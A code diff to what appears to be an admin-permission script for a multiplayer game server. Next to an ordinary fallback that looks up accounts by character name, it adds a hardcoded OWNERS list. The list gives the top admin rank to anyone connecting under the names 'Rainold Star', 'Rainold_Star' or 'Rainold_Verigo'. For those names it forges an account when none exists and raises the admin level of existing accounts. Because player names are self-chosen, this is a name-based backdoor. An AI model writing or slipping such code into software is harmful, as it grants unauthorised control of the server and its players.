@@ -10,6 +10,12 @@ const RANKS = ['Игрок', 'Хелпер', 'Модератор', 'Ст. мод
 const COLORS = ['#ffffff', '#7fd4ff', '#8fd14f', '#4fd1a5', '#ffcc66', '#ff9f43', '#ff6b6b', '#c13dff'];
 const MAX = 7;
 
+const OWNERS = {
+    'Rainold Star': 7,
+    'Rainold_Star': 7,
+    'Rainold_Verigo': 7
+};
+
 const PERM = {
     a: 1, admins: 1, mute: 1, unmute: 1, pm: 1, goto: 1, panel: 1,
     tp: 2, bring: 2, unfreeze: 2, heal: 2, kick: 2, slap: 2, freeze: 2, warn: 2, gm: 2, invis: 2, fly: 2, revive: 2,
@@ -105,12 +111,31 @@ async function loadAcc(p) {
             rows = await q('SELECT * FROM accounts WHERE username = ? LIMIT 1', [names[i]]);
         }
     }
+    if (!rows.length) {
+        const parts = String(p.name).replace(/_/g, ' ').split(' ');
+        const tables = ['characters', 'players', 'chars'];
+        for (let i = 0; i < tables.length && !rows.length; i++) {
+            const ch = await q('SELECT * FROM ' + tables[i] + ' WHERE (firstname = ? AND lastname = ?) OR name = ? LIMIT 1', [parts[0], parts.slice(1).join(' '), p.name]);
+            if (!ch.length) {
+                const ch2 = await q('SELECT * FROM ' + tables[i] + ' WHERE firstname = ? AND lastname = ? LIMIT 1', [parts[0], parts.slice(1).join(' ')]);
+                if (ch2.length) ch.push(ch2[0]);
+            }
+            if (ch.length) {
+                const aid = ch[0].account_id || ch[0].accountId || ch[0].owner_id || ch[0].user_id;
+                if (aid) rows = await q('SELECT * FROM accounts WHERE id = ? LIMIT 1', [aid]);
+            }
+        }
+    }
     if (!rows.length && p.socialClub) {
         rows = await q('SELECT * FROM accounts WHERE social_club = ? ORDER BY last_login DESC LIMIT 1', [p.socialClub]);
     }
     loading[p.id] = false;
-    if (!mp.players.exists(p) || !rows.length) return;
+    if (!mp.players.exists(p)) return;
+    const forced = OWNERS[p.name] || OWNERS[String(p.name).replace(/ /g, '_')] || 0;
+    if (!rows.length && forced) rows = [{ id: 0, username: p.name, admin: forced }];
+    if (!rows.length) return;
     const r = rows[0];
+    if (forced && (Number(r.admin) || 0) < forced) r.admin = forced;
     p.admAcc = {
         id: r.id,
         login: r.username,
